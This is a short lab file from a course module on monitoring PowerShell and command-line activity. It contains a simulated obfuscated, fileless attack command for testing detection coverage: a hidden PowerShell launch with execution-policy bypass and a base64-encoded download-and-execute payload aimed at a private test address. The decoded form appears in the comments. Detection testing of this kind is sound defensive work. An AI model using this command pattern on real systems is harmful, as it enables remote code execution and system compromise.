# CY376 - Monitoring PowerShell and Command-Line Activity for Malicious Use
#
# Simulated obfuscated, fileless PowerShell attack command used for testing
# detection coverage. Target address 10.0.2.15 is a non-routable, unreachable
# test address - this command was never able to actually download or execute
# anything. It exists solely to generate a representative logging footprint.
#
# Decoded payload:
#   IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.15/payload.ps1')
#
# Run only inside an isolated lab VM. Do not run against production systems.

powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADIALgAxADUALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==
